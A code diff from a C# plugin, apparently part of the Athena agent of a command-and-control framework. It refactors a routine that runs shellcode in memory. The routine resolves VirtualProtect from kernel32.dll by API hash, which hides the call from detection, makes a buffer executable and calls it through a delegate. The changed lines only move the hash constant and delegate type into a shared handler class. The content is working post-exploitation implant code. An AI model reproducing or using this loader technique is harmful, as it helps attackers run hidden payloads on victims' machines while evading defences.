@@ -8,6 +8,7 @@ using Athena.Utilities;
 using Athena.Models;
 using Athena.Commands;
 using Athena.Models.Responses;
+using static Athena.Commands.DynamicHandler;
 
 namespace Plugins
 {
@@ -29,9 +30,8 @@ namespace Plugins
             PAGE_NOCACHE = 0x00000200,
             PAGE_WRITECOMBINE = 0x00000400
         }
-        const long VirtPro = 65467780416196;
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
-        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        //[UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        //public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         public override void Execute(Dictionary<string, string> args)
         {
             byte[] buffer;
@@ -81,8 +81,8 @@ namespace Plugins
                         {
                             IntPtr pAddr = (IntPtr)ptr;
                             uint lpfOldProtect = 0;
-                            IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
-                            VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
+                            IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", DynamicHandler.VirtPro); //Get Pointer for VirtualProtect function
+                            DynamicVirtPro ptrVPD = (DynamicHandler.DynamicVirtPro)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(DynamicHandler.DynamicVirtPro)); //Create VirtualProtect Delegate
                             ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
 
                             BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
